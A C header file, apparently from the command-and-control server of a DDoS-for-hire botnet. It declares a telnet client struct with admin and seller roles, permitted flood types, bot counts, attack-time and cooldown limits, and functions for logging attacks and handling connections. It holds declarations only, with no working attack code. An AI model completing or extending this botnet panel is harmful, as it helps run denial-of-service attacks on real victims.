#pragma once

#include <time.h>
#include <arpa/inet.h>

#include "bool.h"
#include "main.h"

#define ADDUSER_EVENT 1
#define DELETEUSER_EVENT 2
#define RENEWUSER_EVENT 3

struct client_t {
	int fd;

	char username[20], buff[8096], *save_ptr;
	char password[64];

	BOOL admin, seller;

	/* floods */
	char **floods;
	uint8_t flood_count;

	uint32_t real_cooldown;
	uint32_t bots, attacktime, cooldown;

	struct sockaddr_in addr;

	BOOL connected, authenticated;

	struct client_t *next, *prev;
} typedef client_t;

void client_log_user_event(client_t *, int, char *);
void client_log_attack(client_t *, char *);

void *client_connection_handler(void *);

BOOL handle_iacs(client_t *);

void telnet_send_query(client_t *);

int telnet_wait_for(client_t *, char *, int, BOOL);
